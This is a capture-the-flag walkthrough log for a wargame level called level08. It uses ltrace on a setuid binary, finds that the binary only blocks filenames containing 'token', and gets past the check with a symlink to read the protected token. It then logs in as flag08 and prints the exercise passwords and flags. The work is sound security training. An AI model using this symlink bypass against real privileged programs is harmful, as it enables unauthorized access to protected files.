level08  token

-> ltrace ./level08
__libc_start_main(0x8048554, 1, 0xbffff6e4, 0x80486b0, 0x8048720 <unfinished ...>
printf("%s [file to read]\n", "./level08"./level08 [file to read]
)               = 25
exit(1 <unfinished ...>
+++ exited (status 1) +++

-> ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff6e4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                 = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)             = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++

-> touch /tmp/level08_test
-> chmod 777 /tmp/level08_test
-> ltrace ./level08 /tmp/level08_test
__libc_start_main(0x8048554, 2, 0xbffff6d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/tmp/level08_test", "token")                      = NULL
open("/tmp/level08_test", 0, 014435162522)                = 3
read(3, "", 1024)                                        = 0
write(1, "", 0)                                          = 0
+++ exited (status 0) +++

-> ln -s /home/user/level08/token /tmp/level08_ref
-> ./level08 /tmp/level08_ref
quif5eloekouj29ke0vouxean

-> su flag08
-> getflag
25749xKZ8L7DkSCwJkT9dyv6f
-> su level09
